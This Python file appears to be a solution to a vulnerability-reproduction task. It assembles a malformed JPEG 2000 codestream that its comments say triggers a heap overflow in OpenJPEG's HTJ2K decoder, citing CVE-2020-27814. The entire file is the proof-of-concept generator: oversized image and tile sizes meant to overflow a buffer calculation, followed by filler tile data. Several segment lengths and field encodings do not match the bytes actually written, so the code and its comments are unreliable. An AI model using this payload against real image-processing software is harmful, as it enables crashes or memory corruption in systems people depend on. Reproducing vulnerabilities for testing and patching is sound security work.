import os
import struct
import tarfile
import tempfile

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a minimal JPEG 2000 codestream that triggers the heap overflow
        # Based on CVE-2020-27814 - OpenJPEG opj_t1_allocate_buffers HTJ2K vulnerability
        
        # Main JPEG 2000 codestream structure
        poc = bytearray()
        
        # SOC (Start of Codestream)
        poc.extend(b'\xff\x4f')
        
        # SIZ marker (Image and tile size)
        # This sets up the parameters that will cause the overflow
        poc.extend(b'\xff\x51')  # SIZ marker
        poc.extend(b'\x00\x2f')  # Lsiz = 47
        
        # Rsiz = 2 (HTJ2K support)
        poc.extend(b'\x00\x02')
        
        # Image size: 0x10001 x 0x10001 pixels
        # This large size causes integer overflow in buffer calculation
        poc.extend(struct.pack('>I', 0x10001))  # Xsiz
        poc.extend(struct.pack('>I', 0x10001))  # Ysiz
        poc.extend(struct.pack('>I', 0))        # XOsiz
        poc.extend(struct.pack('>I', 0))        # YOsiz
        
        # Tile size: 0x10000 x 0x10000
        # Large tile size triggers the overflow
        poc.extend(struct.pack('>I', 0x10000))  # XTsiz
        poc.extend(struct.pack('>I', 0x10000))  # YTsiz
        poc.extend(struct.pack('>I', 0))        # XTOsiz
        poc.extend(struct.pack('>I', 0))        # YTOsiz
        
        # 1 component, 8-bit
        poc.extend(b'\x00\x01')  # Csiz = 1
        
        # Component parameters
        poc.extend(b'\x07')  # Ssiz = 7 (signed 8-bit)
        poc.extend(b'\x01')  # XRsiz = 1
        poc.extend(b'\x01')  # YRsiz = 1
        
        # COD marker (Coding style default)
        poc.extend(b'\xff\x52')  # COD marker
        poc.extend(b'\x00\x0c')  # Lcod = 12
        
        # Scod: HTJ2K enabled (bit 7 = 1), precincts (bit 0 = 1)
        poc.extend(b'\x81')  # HTJ2K + precincts
        
        # Progression order: LRCP
        poc.extend(b'\x00')
        
        # Number of layers: 1
        poc.extend(b'\x00\x01')
        
        # Multiple component transformation: none
        poc.extend(b'\x00')
        
        # Codeblock size: 64x64
        poc.extend(b'\x40\x40')
        
        # Codeblock style: HTJ2K
        poc.extend(b'\x00')
        
        # Transformation: 9-7 irreversible
        poc.extend(b'\x01')
        
        # Precinct sizes: 128x128, 64x64, 32x32
        poc.extend(b'\x77\x77\x77')
        
        # QCD marker (Quantization default)
        poc.extend(b'\xff\x5c')  # QCD marker
        poc.extend(b'\x00\x0b')  # Lqcd = 11
        
        # Sqcd: scalar derived, 8-bit exponent
        poc.extend(b'\x01')
        
        # SPqcd: quantization values for 1 component
        poc.extend(struct.pack('>H', 0x0000))  # Mantissa 0, exponent 0
        poc.extend(struct.pack('>H', 0x8400))  # Mantissa 0x40, exponent 8
        poc.extend(struct.pack('>H', 0x8800))  # Mantissa 0x40, exponent 8
        poc.extend(struct.pack('>H', 0x8c00))  # Mantissa 0x40, exponent 8
        
        # SOT marker (Start of tile)
        poc.extend(b'\xff\x90')  # SOT marker
        poc.extend(b'\x00\x0a')  # Lsot = 10
        poc.extend(b'\x00\x00')  # Isot = 0
        poc.extend(struct.pack('>I', len(poc) + 12 + 1390))  # Psot = tile part length
        poc.extend(b'\x00')     # TPsot = 0
        poc.extend(b'\x01')     # TNsot = 1
        
        # SOD marker (Start of data)
        poc.extend(b'\xff\x93')
        
        # HTJ2K compressed data that triggers the overflow
        # This data causes the opj_t1_allocate_buffers to miscalculate buffer size
        ht_data = bytearray()
        
        # ZC: 0, SEGSYM: 0, HT Cleanup segment
        ht_data.extend(b'\x00')
        
        # Length of cleanup pass
        ht_data.extend(struct.pack('>H', 1385))
        
        # Add pattern that triggers the overflow
        # This creates a scenario where w * h * 3 * sizeof(OPJ_INT32) overflows
        ht_data.extend(b'\x01' * 1385)
        
        poc.extend(ht_data)
        
        # EOC marker (End of codestream)
        poc.extend(b'\xff\xd9')
        
        return bytes(poc)